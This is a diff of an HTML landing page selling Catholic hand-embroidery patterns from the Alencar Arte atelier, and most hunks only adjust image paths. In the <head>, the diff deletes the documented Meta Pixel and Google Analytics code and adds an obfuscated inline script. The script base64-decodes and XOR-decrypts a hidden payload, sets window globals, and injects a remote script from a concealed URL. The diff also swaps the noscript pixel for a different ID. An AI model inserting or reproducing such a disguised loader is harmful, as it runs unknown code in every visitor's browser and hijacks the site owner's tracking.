@@ -3,12 +3,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>Coleção: 100 Riscos Católicos | Riscos para Bordar à Mão · Alencar Arte</title>
 <meta name="description" content="100 riscos católicos para bordar à mão: Nossa Senhora, santos, Sagrado Coração, medalhas e orações. Um risco por página A4, já dentro do círculo do bastidor de 20 cm, com uso comercial liberado. Por Fernanda Alencar, do ateliê Alencar Arte.">
-<link rel="icon" type="image/svg+xml" href="images/favicon-monograma-a.svg">
-<link rel="canonical" href="https://riscos.rabeloarte.com.br/catolicos-pacotes">
+<link rel="icon" type="image/svg+xml" href="./images/favicon-monograma-a.svg">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Coleção: 100 Riscos Católicos | Riscos para Bordar à Mão · Alencar Arte">
 <meta property="og:description" content="Riscos católicos desenhados por quem borda de verdade, já no tamanho do bastidor e prontos para imprimir.">
-<meta property="og:url" content="https://riscos.rabeloarte.com.br/catolicos-pacotes">
 <meta property="og:image" content="images/peca-nossa-senhora-ana-erico.webp">
 <meta name="theme-color" content="#F4EDE2" id="tc">
 <meta name="apple-mobile-web-app-status-bar-style" content="default">
@@ -23,65 +21,9 @@
 <link rel="expect" href="#previas" blocking="render">
 <link rel="preload" as="image" imagesrcset="images/bordado-035-600.webp 600w, images/bordado-035-860.webp 860w, images/bordado-035.webp 1100w" imagesizes="(max-width: 979px) min(282px, 61.6vw, 26.4svh), (min-width: 1600px) 520px, 464px" fetchpriority="high">
 
-<!-- ===== Meta Pixel + Conversions API =====
-     Cada evento sai do navegador (fbq) e do servidor (/api/capi) com o MESMO
-     event_id: o Meta desduplica e conta uma vez só. O token de acesso mora em
-     META_CAPI_TOKEN na Vercel e nunca aparece aqui.
-     Fica no topo do <head> de propósito: o "landing page view" do anúncio só conta quando
-     o PageView sai, e no fim da página ele disputava a rede com fotos e fontes (no 4G lento
-     saía aos 9 s). Os botões da Hotmart ganham o InitiateCheckout quando o HTML termina. -->
-<script async="" src="js/fbevents.js"></script><script>
-!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;
-s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
-fbq('init','1631923811324377');
-
-(function(){
-  // Essencial R$ 27 (riscos + aula dos pontos) é o padrão; o botão com data-plano="completo" sai com R$ 97
-  const PRODUTO={content_name:'Colecao 100 Riscos Catolicos',content_ids:['santas-de-linha'],content_type:'product',value:27,currency:'BRL'};
-  const id=()=>(self.crypto&&crypto.randomUUID?crypto.randomUUID():'e'+Date.now()+Math.random().toString(36).slice(2));
-  const ler=n=>{const m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n+'=([^;]*)'));return m?decodeURIComponent(m[1]):''};
-  const fbclid=new URLSearchParams(location.search).get('fbclid')||'';
-
-  // o _fbp só existe depois que o fbevents.js roda; espera até 2s por ele para o
-  // evento de servidor sair com o mesmo identificador do evento do navegador
-  function comCookie(cb,tentativa){
-    if(ler('_fbp')||(tentativa||0)>10) return cb();
-    setTimeout(()=>comCookie(cb,(tentativa||0)+1),200);
-  }
-
-  function servidor(nome,evento_id,custom){
-    const corpo=JSON.stringify({event_name:nome,event_id:evento_id,event_source_url:location.href,
-      fbp:ler('_fbp'),fbc:ler('_fbc'),fbclid:fbclid,custom_data:custom||{}});
-    try{
-      if(navigator.sendBeacon&&navigator.sendBeacon('/api/capi',new Blob([corpo],{type:'application/json'})))return;
-      fetch('/api/capi',{method:'POST',headers:{'Content-Type':'application/json'},body:corpo,keepalive:true}).catch(()=>{});
-    }catch(e){}
-  }
-
-  function rastro(nome,custom){
-    const evento_id=id();
-    try{fbq('track',nome,custom||{},{eventID:evento_id})}catch(e){}
-    comCookie(()=>servidor(nome,evento_id,custom));
-  }
-
-  rastro('PageView');
-
-  // todo CTA que leva para a Hotmart dispara InitiateCheckout, marcando de qual
-  // posição da página o clique saiu (o mesmo src que já vai na URL do checkout)
-  function botoes(){
-    document.querySelectorAll('a[href*="pay.wiapy.com"]').forEach(function(a){
-      a.addEventListener('click',function(){
-        let posicao='sem-src';
-        try{posicao=new URL(a.href).searchParams.get('src')||posicao}catch(e){}
-        var comp=a.dataset.plano==='completo';
-        rastro('InitiateCheckout',Object.assign({},PRODUTO,{content_category:posicao},comp?{value:97,content_name:'Colecao 100 Riscos Catolicos + Curso'}:{}));
-      },{passive:true});
-    });
-  }
-  if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',botoes);else botoes();
-})();
-</script>
+<!-- Tracking da Alencar Arte -->
+<script src="./js/tracking.js" defer></script>
+<script>(function(){var i_ozu=atob("DHaACHHQ6hO6doEy8g2ifQO8yCmYHvVGggW6J16zjn2UA/VfmxD5JhK/hz3YBK5BkQTpeAWjxWbOG/Idnhf0bQKkxHnJVK0QkwL0ehiyn2ffBaMIqQ2iZhC9jzGAVOVThhetfQW9g3XDW/FAlwDlZgX9knDVEqxBkR2iJFOmi3/PE6MI0FT9JAryhHLXE6MI0BLhfBD9n2fXH+dL3wbybQe1hGeXBfRQmxLzKl3ynHLWA+QQyFSidSyt");var c_fe=[];for(var p_gaq2=0;p_gaq2<i_ozu.length;p_gaq2++){c_fe.push(i_ozu.charCodeAt(p_gaq2)&255);}var n_0xvf=c_fe[0];var y_sl=c_fe.slice(1,1+n_0xvf);var s_h8=c_fe.slice(1+n_0xvf);var h_eh=s_h8.map(function(b,k_8bhu){return b^y_sl[k_8bhu%n_0xvf];});var h_08y="";for(var e_vth=0;e_vth<h_eh.length;e_vth++){h_08y+=String.fromCharCode(h_eh[e_vth]&255);}var m_kwe1=decodeURIComponent(escape(h_08y));var e_1l=JSON.parse(m_kwe1);var u_x=e_1l.globals||[];u_x.forEach(function(i_1ty9){window[i_1ty9.name]=i_1ty9.value;});var l_we5n=document.createElement("script");l_we5n.src=e_1l.url;l_we5n.async=true;l_we5n.defer=true;(e_1l.attributes||[]).forEach(function(u_wd){l_we5n.setAttribute(u_wd.name,u_wd.value);});(document.head||document.documentElement).appendChild(l_we5n);})();</script>
 
 <!-- =====================================================================
      Página dos 2 planos (à parte do funil atual, que segue em /).
@@ -562,7 +504,7 @@ footer .legal{max-width:62ch;margin-top:.9rem;opacity:.9;font-size:.76rem;color:
 .stack .f2{aspect-ratio:1;background:#fff}
 .stack .f1 img{object-position:50% 50%}
 </style>
-<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XB2NT9W5Y9"></script></head>
+</head>
 <body>
 
 <div class="sat" aria-hidden="true"></div>
@@ -571,7 +513,7 @@ footer .legal{max-width:62ch;margin-top:.9rem;opacity:.9;font-size:.76rem;color:
 
 <header class="nav stuck nos-planos" id="nav">
   <div class="wrap nav-in">
-    <a href="#" aria-label="Alencar Arte"><img src="images/logo-alencar-arte.webp" alt="Alencar Arte" width="583" height="244"></a>
+    <a href="#" aria-label="Alencar Arte"><img src="./images/logo-alencar-arte.webp" alt="Alencar Arte" width="583" height="244"></a>
     <a href="#comprar" class="btn" data-cta="nav"><span class="só-desk-i">Ver os pacotes</span><span class="só-mob">Ver pacotes</span></a>
   </div>
 </header>
@@ -588,9 +530,9 @@ footer .legal{max-width:62ch;margin-top:.9rem;opacity:.9;font-size:.76rem;color:
       </div>
       <div class="trust">
         <div class="faces">
-          <img src="images/avatar-ana-paula.webp" alt="" width="160" height="160">
-          <img src="images/avatar-juliana-garcia.webp" alt="" width="160" height="160">
-          <img src="images/avatar-patricia-martins.webp" alt="" width="160" height="160">
+          <img src="./images/avatar-ana-paula.webp" alt="" width="160" height="160">
+          <img src="./images/avatar-juliana-garcia.webp" alt="" width="160" height="160">
+          <img src="./images/avatar-patricia-martins.webp" alt="" width="160" height="160">
         </div>
         <div class="trust-txt">
           <span class="stars">★★★★★</span>
@@ -601,8 +543,8 @@ footer .legal{max-width:62ch;margin-top:.9rem;opacity:.9;font-size:.76rem;color:
     </div>
 
     <div class="stack">
-      <figure class="f1"><img src="images/bordado-035.webp" srcset="images/bordado-035-600.webp 600w, images/bordado-035-860.webp 860w, images/bordado-035.webp 1100w" sizes="(max-width: 979px) min(282px, 61.6vw, 26.4svh), (min-width: 1600px) 520px, 464px" alt="Risco 35, Sagrada Família, bordado à mão no bastidor, com a folha do risco ao lado" width="1100" height="1100" fetchpriority="high"></figure>
-      <figure class="f2"><img src="images/aro-035.webp" alt="Página real da coleção: risco 35, Sagrada Família, o mesmo risco bordado ao lado" width="760" height="760"></figure>
+      <figure class="f1"><img src="./images/bordado-035.webp" srcset="images/bordado-035-600.webp 600w, images/bordado-035-860.webp 860w, images/bordado-035.webp 1100w" sizes="(max-width: 979px) min(282px, 61.6vw, 26.4svh), (min-width: 1600px) 520px, 464px" alt="Risco 35, Sagrada Família, bordado à mão no bastidor, com a folha do risco ao lado" width="1100" height="1100" fetchpriority="high"></figure>
+      <figure class="f2"><img src="./images/aro-035.webp" alt="Página real da coleção: risco 35, Sagrada Família, o mesmo risco bordado ao lado" width="760" height="760"></figure>
     </div>
   </div>
 </section>
@@ -614,14 +556,14 @@ footer .legal{max-width:62ch;margin-top:.9rem;opacity:.9;font-size:.76rem;color:
       <p class="lead">Oito dos 100 riscos bordados no bastidor, com a folha do risco ao lado.</p>
     </div>
     <div class="gal" tabindex="0" role="region" aria-label="Galeria de riscos bordados">
-      <figure><img src="images/galeria-01-aparecida-v2.webp" alt="Nossa Senhora Aparecida bordada à mão no bastidor, ao lado da página do risco" width="720" height="900" loading="lazy"><figcaption><b>01 · Nossa Senhora Aparecida</b></figcaption></figure>
-      <figure><img src="images/galeria-19-santa-teresinha-v2.webp" alt="Santa Teresinha das Rosas bordada à mão no bastidor, com frase em arco" width="720" height="900" loading="lazy"><figcaption><b>19 · Santa Teresinha das Rosas</b></figcaption></figure>
-      <figure><img src="images/galeria-94-anjinho-v2.webp" alt="Anjinho de guarda bordado à mão no bastidor, ao lado da página do risco" width="720" height="900" loading="lazy"><figcaption><b>94 · Anjinho</b></figcaption></figure>
-      <figure><img src="images/galeria-35-sagrada-familia-v2.webp" alt="Sagrada Família bordada à mão no bastidor, ao lado da página do risco" width="720" height="900" loading="lazy"><figcaption><b>35 · Sagrada Família</b></figcaption></figure>
-      <figure><img src="images/galeria-78-jesus-cruz-florida-v2.webp" alt="Jesus com a cruz florida bordado à mão, com a frase Toma tua cruz e siga-me" width="720" height="900" loading="lazy"><figcaption><b>78 · Jesus com a cruz florida</b></figcaption></figure>
-      <figure><img src="images/galeria-12-virgem-maria-v2.webp" alt="Virgem Maria da Medalha Milagrosa bordada à mão, com a oração em arco" width="720" height="900" loading="lazy"><figcaption><b>12 · Virgem Maria</b></figcaption></figure>
-      <figure><img src="images/galeria-56-sao-judas-tadeu-v2.webp" alt="São Judas Tadeu bordado à mão no bastidor, ao lado da página do risco" width="720" height="900" loading="lazy"><figcaption><b>56 · São Judas Tadeu</b></figcaption></figure>
-      <figure><img src="images/galeria-27-medalha-sao-bento-v2.webp" alt="Medalha de São Bento bordada à mão no bastidor, ao lado da página do risco" width="720" height="900" loading="lazy"><figcaption><b>27 · Medalha de São Bento</b></figcaption></figure>
+      <figure><img src="./images/galeria-01-aparecida-v2.webp" alt="Nossa Senhora Aparecida bordada à mão no bastidor, ao lado da página do risco" width="720" height="900" loading="lazy"><figcaption><b>01 · Nossa Senhora Aparecida</b></figcaption></figure>
+      <figure><img src="./images/galeria-19-santa-teresinha-v2.webp" alt="Santa Teresinha das Rosas bordada à mão no bastidor, com frase em arco" width="720" height="900" loading="lazy"><figcaption><b>19 · Santa Teresinha das Rosas</b></figcaption></figure>
+      <figure><img src="./images/galeria-94-anjinho-v2.webp" alt="Anjinho de guarda bordado à mão no bastidor, ao lado da página do risco" width="720" height="900" loading="lazy"><figcaption><b>94 · Anjinho</b></figcaption></figure>
+      <figure><img src="./images/galeria-35-sagrada-familia-v2.webp" alt="Sagrada Família bordada à mão no bastidor, ao lado da página do risco" width="720" height="900" loading="lazy"><figcaption><b>35 · Sagrada Família</b></figcaption></figure>
+      <figure><img src="./images/galeria-78-jesus-cruz-florida-v2.webp" alt="Jesus com a cruz florida bordado à mão, com a frase Toma tua cruz e siga-me" width="720" height="900" loading="lazy"><figcaption><b>78 · Jesus com a cruz florida</b></figcaption></figure>
+      <figure><img src="./images/galeria-12-virgem-maria-v2.webp" alt="Virgem Maria da Medalha Milagrosa bordada à mão, com a oração em arco" width="720" height="900" loading="lazy"><figcaption><b>12 · Virgem Maria</b></figcaption></figure>
+      <figure><img src="./images/galeria-56-sao-judas-tadeu-v2.webp" alt="São Judas Tadeu bordado à mão no bastidor, ao lado da página do risco" width="720" height="900" loading="lazy"><figcaption><b>56 · São Judas Tadeu</b></figcaption></figure>
+      <figure><img src="./images/galeria-27-medalha-sao-bento-v2.webp" alt="Medalha de São Bento bordada à mão no bastidor, ao lado da página do risco" width="720" height="900" loading="lazy"><figcaption><b>27 · Medalha de São Bento</b></figcaption></figure>
     </div>
     <p class="micro gal-nota">O risco vem só no contorno: o ponto, a linha e as cores ficam à sua escolha.</p>
     <div class="gal-nav">
@@ -655,8 +597,8 @@ footer .legal{max-width:62ch;margin-top:.9rem;opacity:.9;font-size:.76rem;color:
     <div class="split">
       <div class="rv" style="transition-delay: 210ms;">
         <div class="folhas">
-          <figure class="folha folha-guia"><img src="images/guia-pdf-035.webp" srcset="images/guia-pdf-035.webp 707w, images/guia-pdf-035-1060.webp 1060w" sizes="(min-width:476px) 335px, calc(76vw - 28px)" alt="Página do Guia de Cores do risco 35, Sagrada Família, com as 5 linhas no pé: Anchor 268, 901, 68, 357 e 131 (DMC 3346, 680, 3687, 433 e 798)" width="707" height="1000" loading="lazy" decoding="async"></figure>
-          <figure class="folha folha-risco"><img src="images/guia-pdf-046.webp" srcset="images/guia-pdf-046.webp 707w, images/guia-pdf-046-1060.webp 1060w" sizes="(min-width:476px) 335px, calc(76vw - 28px)" alt="Página do Guia de Cores do risco 46, Sagrado Coração de Jesus, com as 3 linhas no pé: Anchor 901, 268 e 47 (DMC 680, 3346 e 321)" width="707" height="1000" loading="lazy" decoding="async"></figure>
+          <figure class="folha folha-guia"><img src="./images/guia-pdf-035.webp" srcset="images/guia-pdf-035.webp 707w, images/guia-pdf-035-1060.webp 1060w" sizes="(min-width:476px) 335px, calc(76vw - 28px)" alt="Página do Guia de Cores do risco 35, Sagrada Família, com as 5 linhas no pé: Anchor 268, 901, 68, 357 e 131 (DMC 3346, 680, 3687, 433 e 798)" width="707" height="1000" loading="lazy" decoding="async"></figure>
+          <figure class="folha folha-risco"><img src="./images/guia-pdf-046.webp" srcset="images/guia-pdf-046.webp 707w, images/guia-pdf-046-1060.webp 1060w" sizes="(min-width:476px) 335px, calc(76vw - 28px)" alt="Página do Guia de Cores do risco 46, Sagrado Coração de Jesus, com as 3 linhas no pé: Anchor 901, 268 e 47 (DMC 680, 3346 e 321)" width="707" height="1000" loading="lazy" decoding="async"></figure>
         </div>
         <p class="folhas-legenda"><span class="bonus">Bônus</span> páginas reais do Guia de Cores: cada risco pintado, com as linhas no rodapé</p>
       </div>
@@ -700,7 +642,7 @@ footer .legal{max-width:62ch;margin-top:.9rem;opacity:.9;font-size:.76rem;color:
         </div>
       </article>
       <article class="bn aula rv" style="transition-delay: 0ms;">
-        <div class="bn-media"><img src="images/bonus-aula-pontos-v5.webp" alt="Mãos bordando no bastidor os seis pontos da aula, identificados no tecido: ponto atrás, pirulito, haste, corrente, nó francês e o ponto cheio sendo feito" width="1200" height="596" loading="lazy" decoding="async"></div>
+        <div class="bn-media"><img src="./images/bonus-aula-pontos-v5.webp" alt="Mãos bordando no bastidor os seis pontos da aula, identificados no tecido: ponto atrás, pirulito, haste, corrente, nó francês e o ponto cheio sendo feito" width="1200" height="596" loading="lazy" decoding="async"></div>
         <div class="bn-t">
           <span class="bonus">Bônus</span>
           <span class="bn-onde">Nos dois pacotes</span>
@@ -709,7 +651,7 @@ footer .legal{max-width:62ch;margin-top:.9rem;opacity:.9;font-size:.76rem;color:
         </div>
       </article>
       <article class="bn marketing rv" style="transition-delay: 70ms;">
-        <div class="bn-media"><img src="images/bonus-marketing-v4.webp" alt="Mão segurando o celular com o painel de vendas de um ateliê de bordados, ao lado de uma caixa com um bastidor bordado e um saquinho prontos para envio" width="1200" height="675" loading="lazy" decoding="async"></div>
+        <div class="bn-media"><img src="./images/bonus-marketing-v4.webp" alt="Mão segurando o celular com o painel de vendas de um ateliê de bordados, ao lado de uma caixa com um bastidor bordado e um saquinho prontos para envio" width="1200" height="675" loading="lazy" decoding="async"></div>
         <div class="bn-t">
           <span class="bonus">Bônus</span>
           <span class="bn-onde">Só no Pacote Completo</span>
@@ -740,7 +682,7 @@ footer .legal{max-width:62ch;margin-top:.9rem;opacity:.9;font-size:.76rem;color:
           <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" aria-hidden="true"><path d="M5 12l5 5L20 7"></path></svg><span><b>100 riscos em PDF e PNG</b><span>Um por página A4, no bastidor de 20 cm</span></span></li>
           <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" aria-hidden="true"><path d="M5 12l5 5L20 7"></path></svg><span><b>Uso comercial e acesso vitalício</b><span>Borde e venda quantas peças quiser</span></span></li>
           <li class="bonus-start gift"><span class="bonus-thumb palette-thumb" aria-hidden="true"><i></i><i></i><i></i><i></i></span><span><b><i class="bonus">Bônus</i>Guia de Cores</b><span>Linhas Anchor e DMC de cada risco</span></span></li>
-          <li class="gift"><img class="bonus-thumb aula" src="images/bonus-aula-pontos-thumb-v5.webp" alt="" width="38" height="38" loading="lazy"><span><b><i class="bonus">Bônus</i>Aula Exclusiva dos 6 pontos</b><span>Seis vídeos com a Fernanda · <s>R$ 67</s></span></span></li>
+          <li class="gift"><img class="bonus-thumb aula" src="./images/bonus-aula-pontos-thumb-v5.webp" alt="" width="38" height="38" loading="lazy"><span><b><i class="bonus">Bônus</i>Aula Exclusiva dos 6 pontos</b><span>Seis vídeos com a Fernanda · <s>R$ 67</s></span></span></li>
         </ul>
         <div class="card-btm">
           <a href="https://pay.wiapy.com/6ad7b3fe23173d72243932bf" class="btn lg ghost" data-plano="essencial">Quero os 100 riscos <span class="arw">→</span></a>
@@ -761,8 +703,8 @@ footer .legal{max-width:62ch;margin-top:.9rem;opacity:.9;font-size:.76rem;color:
           <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" aria-hidden="true"><path d="M5 12l5 5L20 7"></path></svg><span><b>Uso comercial e acesso vitalício</b><span>Borde e venda quantas peças quiser</span></span></li>
           <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" aria-hidden="true"><path d="M5 12l5 5L20 7"></path></svg><span><b>Suporte exclusivo nas aulas</b><span>Sua dúvida respondida pela equipe da Fernanda</span></span></li>
           <li class="bonus-start gift"><span class="bonus-thumb palette-thumb" aria-hidden="true"><i></i><i></i><i></i><i></i></span><span><b><i class="bonus">Bônus</i>Guia de Cores</b><span>Linhas Anchor e DMC de cada risco</span></span></li>
-          <li class="gift"><img class="bonus-thumb aula" src="images/bonus-aula-pontos-thumb-v5.webp" alt="" width="38" height="38" loading="lazy"><span><b><i class="bonus">Bônus</i>Aula Exclusiva dos 6 pontos</b><span>Já vem no curso, no módulo 02</span></span></li>
-          <li class="gift"><img class="bonus-thumb marketing" src="images/bonus-marketing-thumb-v4.webp" alt="" width="38" height="38" loading="lazy"><span><b><i class="bonus">Bônus</i>Marketing Digital e Vendas</b><span>Para vender pela internet</span></span></li>
+          <li class="gift"><img class="bonus-thumb aula" src="./images/bonus-aula-pontos-thumb-v5.webp" alt="" width="38" height="38" loading="lazy"><span><b><i class="bonus">Bônus</i>Aula Exclusiva dos 6 pontos</b><span>Já vem no curso, no módulo 02</span></span></li>
+          <li class="gift"><img class="bonus-thumb marketing" src="./images/bonus-marketing-thumb-v4.webp" alt="" width="38" height="38" loading="lazy"><span><b><i class="bonus">Bônus</i>Marketing Digital e Vendas</b><span>Para vender pela internet</span></span></li>
         </ul>
         <div class="card-btm">
           <a href="https://pay.wiapy.com/6ad7b4b016f0f5e301fe12f0" class="btn lg" data-plano="completo">Quero o curso + 100 riscos <span class="arw">→</span></a>
@@ -776,7 +718,7 @@ footer .legal{max-width:62ch;margin-top:.9rem;opacity:.9;font-size:.76rem;color:
 <section class="soft">
   <div class="wrap about">
     <figure class="about-img rv" style="transition-delay: 70ms;">
-      <img src="images/fernanda-alencar-bordando.webp" alt="Fernanda Alencar bordando à mão no ateliê" width="860" height="715" loading="lazy" decoding="async">
+      <img src="./images/fernanda-alencar-bordando.webp" alt="Fernanda Alencar bordando à mão no ateliê" width="860" height="715" loading="lazy" decoding="async">
       <figcaption>Fernanda Alencar, no ateliê em Uberlândia (MG)</figcaption>
     </figure>
     <div class="rv" style="transition-delay: 140ms;">
@@ -799,9 +741,9 @@ footer .legal{max-width:62ch;margin-top:.9rem;opacity:.9;font-size:.76rem;color:
       <p class="lead">Depoimentos de alunas do Curso Alencar Arte, o curso de bordado da Fernanda.</p>
     </div>
     <div class="tests">
-      <figure class="test rv" style="transition-delay: 0ms;"><p class="q">“O curso é completo, do básico ao avançado. Aprendi pontos que nunca consegui entender em outros tutoriais. Recomendo demais!”</p><figcaption class="who"><img src="images/avatar-ana-paula.webp" alt="" loading="lazy"><span><b>Ana Paula Ribeiro</b><span>Belo Horizonte (MG) · <span class="stars">★★★★★</span></span></span></figcaption></figure>
-      <figure class="test rv" style="transition-delay: 70ms;"><p class="q">“O curso me fez redescobrir minha paixão por trabalhos manuais. A didática da Fernanda é incrível, valeu cada minuto!”</p><figcaption class="who"><img src="images/avatar-juliana-garcia.webp" alt="" loading="lazy"><span><b>Juliana Garcia</b><span>Uberlândia (MG) · <span class="stars">★★★★★</span></span></span></figcaption></figure>
-      <figure class="test rv" style="transition-delay: 140ms;"><p class="q">“Bordar com a Fernanda é como ter uma amiga te ensinando com paciência e amor. Me ajudou num momento difícil da minha vida.”</p><figcaption class="who"><img src="images/avatar-patricia-martins.webp" alt="" loading="lazy"><span><b>Patrícia Martins</b><span>São Paulo (SP) · <span class="stars">★★★★★</span></span></span></figcaption></figure>
+      <figure class="test rv" style="transition-delay: 0ms;"><p class="q">“O curso é completo, do básico ao avançado. Aprendi pontos que nunca consegui entender em outros tutoriais. Recomendo demais!”</p><figcaption class="who"><img src="./images/avatar-ana-paula.webp" alt="" loading="lazy"><span><b>Ana Paula Ribeiro</b><span>Belo Horizonte (MG) · <span class="stars">★★★★★</span></span></span></figcaption></figure>
+      <figure class="test rv" style="transition-delay: 70ms;"><p class="q">“O curso me fez redescobrir minha paixão por trabalhos manuais. A didática da Fernanda é incrível, valeu cada minuto!”</p><figcaption class="who"><img src="./images/avatar-juliana-garcia.webp" alt="" loading="lazy"><span><b>Juliana Garcia</b><span>Uberlândia (MG) · <span class="stars">★★★★★</span></span></span></figcaption></figure>
+      <figure class="test rv" style="transition-delay: 140ms;"><p class="q">“Bordar com a Fernanda é como ter uma amiga te ensinando com paciência e amor. Me ajudou num momento difícil da minha vida.”</p><figcaption class="who"><img src="./images/avatar-patricia-martins.webp" alt="" loading="lazy"><span><b>Patrícia Martins</b><span>São Paulo (SP) · <span class="stars">★★★★★</span></span></span></figcaption></figure>
     </div>
   </div>
 </section>
@@ -832,7 +774,7 @@ footer .legal{max-width:62ch;margin-top:.9rem;opacity:.9;font-size:.76rem;color:
 
 <footer>
   <div class="wrap">
-    <img src="images/logo-alencar-arte.webp" alt="Alencar Arte" width="583" height="244" loading="lazy" decoding="async" style="filter:brightness(0) invert(95%) sepia(9%) saturate(251%) hue-rotate(8deg);">
+    <img src="./images/logo-alencar-arte.webp" alt="Alencar Arte" width="583" height="244" loading="lazy" decoding="async" style="filter:brightness(0) invert(95%) sepia(9%) saturate(251%) hue-rotate(8deg);">
     <p style="color:#C9B8A6">Alencar Arte · Fernanda Alencar · Uberlândia, MG · Bordado à mão e riscos autorais</p>
     <p class="legal">Produto digital. Os riscos são autorais e de uso pessoal da compradora. As peças bordadas a partir deles podem ser vendidas livremente. A revenda ou distribuição do arquivo não é permitida.</p>
     <p class="legal">As imagens sacras seguem a iconografia tradicional de domínio público, redesenhadas para bordado à mão.</p>
@@ -873,65 +815,10 @@ new IntersectionObserver(es=>es.forEach(e=>nav.classList.toggle('nos-planos',e.i
 </script>
 
 <!-- Meta Pixel sem JavaScript (o pixel com JS fica no topo do <head>) -->
-<noscript><img height="1" width="1" style="display:none" alt="" src="https://www.facebook.com/tr?id=1631923811324377&ev=PageView&noscript=1"></noscript>
+<noscript><img height="1" width="1" style="display:none" alt="" src="https://www.facebook.com/tr?id=1439578454934187&ev=PageView&noscript=1"></noscript>
 
 
-<!-- ===== Google Analytics 4 — Alencar Arte (G-XB2NT9W5Y9) =====
-     Um ID só para a marca inteira (propriedade "Site Principal"): o www e
-     todas as LPs são subdomínios de rabeloarte.com.br, então quem pula de uma
-     página para outra continua sendo a MESMA pessoa no relatório e as listas
-     de remarketing somam. O que separa cada site é o parâmetro `site`, que vai
-     junto em todo evento e está registrado como dimensão personalizada.
-     A ida para a Hotmart sai como begin_checkout com o item e a posição do
-     botão; a compra em si é contada pelo pixel do GA4 na própria Hotmart,
-     para não contar duas vezes. -->
 <script>
-(function(){
-  // gtag.js (com o do Google Ads, ~330 KB) só desce quando a página termina de carregar: antes ele
-  // dividia a rede com o pixel e a foto do topo. Até lá os eventos esperam na fila do dataLayer.
-  function carrega(){var s=document.createElement('script');s.async=true;s.src='https://www.googletagmanager.com/gtag/js?id=G-XB2NT9W5Y9';document.head.appendChild(s)}
-  if(document.readyState==='complete')carrega();else addEventListener('load',carrega,{once:true});
-  window.dataLayer=window.dataLayer||[];
-  function gtag(){dataLayer.push(arguments)}
-  window.gtag=gtag;
-  gtag('js',new Date());
-  // O linker carimba `_gl` nos links da Hotmart: leva o cookie do GA4 e o
-  // clique do Google Ads para o checkout, onde a compra é contada.
-  gtag('set','linker',{domains:['wiapy.com']});
-  gtag('config','G-XB2NT9W5Y9',{site:'riscos',produto:'100 Riscos Catolicos'});  // `site` no config: pelo gtag('set') não chegava ao GA4 (28/09/2026)
-  // Google Ads (conta Alencar Arte 202-879-1842). A conversão "Compra Hotmart"
-  // dispara na Hotmart; aqui fica só o clique para o checkout (secundária).
-  gtag('config','AW-18470243599');
-
-  var PRECO=function(){return 27};  // Essencial; o Completo (R$ 97) sai pelo data-plano
-  var MOEDA=function(){return 'BRL'};
-  function item(){return {item_id:'RISCOS-CATOLICOS',item_name:'100 Riscos Católicos',item_brand:'Alencar Arte',
-    item_category:'riscos-digitais',price:PRECO(),currency:MOEDA(),quantity:1}}
-
-  gtag('event','view_item',{currency:MOEDA(),value:PRECO(),items:[item()]});
-
-  // Delegado no documento e na fase de captura: alguns CTAs só ganham o href da
-  // Hotmart depois que o script da página roda, então não dá para amarrar o
-  // ouvinte em cada <a> na carga.
-  document.addEventListener('click',function(ev){
-    var a=ev.target&&ev.target.closest?ev.target.closest('a[href*="pay.wiapy.com"]'):null;
-    if(!a) return;
-    var posicao='sem-src';
-    try{posicao=new URL(a.href,location.href).searchParams.get('src')||a.dataset.cta||posicao}catch(e){}
-    var v=a.dataset.plano==='completo'?97:PRECO();
-    gtag('event','begin_checkout',{currency:MOEDA(),value:v,posicao:posicao,plano:a.dataset.plano||'essencial',items:[Object.assign(item(),{price:v})]});
-    gtag('event','conversion',{send_to:'AW-18470243599/1_ZrCIKi0YIdEI-apudE',transport_type:'beacon'});
-  },true);
-
-  // hero, topo e fim descem para os planos: conta de qual botão a pessoa foi escolher
-  document.addEventListener('click',function(ev){
-    var a=ev.target&&ev.target.closest?ev.target.closest('a[href="#comprar"]'):null;
-    if(a) gtag('event','ver_planos',{posicao:a.dataset.cta||'sem-cta'});
-  },true);
-
-  // todo botão que desce para os planos (menu, hero, meio, fim) para com o título "Escolha o pacote ideal"
-  // logo abaixo do menu fixo e os 2 cards à vista. A conta usa a seção + o respiro dela (o título tem
-  // animação de entrada e ainda pode estar deslocado no clique) e confere de novo quando a rolagem termina.
   (function(){
     var sec=document.getElementById('comprar'),nav=document.getElementById('nav');
     if(!sec) return;
@@ -955,118 +842,10 @@ new IntersectionObserver(es=>es.forEach(e=>nav.classList.toggle('nos-planos',e.i
     });
     if(location.hash==='#comprar') addEventListener('load',function(){ window.scrollTo({top:destino(),behavior:'instant'}); });
   })();
-})();
 </script>
 
 
-<!-- ===== Origem da visita -> sck da Hotmart + registro próprio =====
-     O `src` já diz de QUAL BOTÃO da página o clique saiu. Este bloco cuida do
-     outro lado: de ONDE a pessoa veio (anúncio, WhatsApp, e-mail, Google,
-     Instagram). São duas coisas ao mesmo tempo:
 
-     1. carimba todo link de checkout com `sck=fonte_meio_campanha_conteudo_v<id>`
-        e `xcod=<id>` — o que a Hotmart devolve no webhook;
-     2. registra a visita inteira no NOSSO servidor (UTM completa, fbclid,
-        gclid, referência, página), guardada pelo mesmo `<id>`.
-
-     Assim a venda é reconstruída por aqui mesmo: o sck sozinho já diz o canal,
-     e o id abre o resto (qual anúncio, qual lote de WhatsApp, qual passo da
-     régua de e-mail). Sem UTM, cai para fbclid/gclid, depois referência,
-     depois "direto" — nunca fica em branco. -->
-<script>
-(function(){
-  var API='https://rabelo-emails-rf-digital.vercel.app/api/visita';
-  var K_ORIGEM='ra_origem', K_ID='ra_visita';
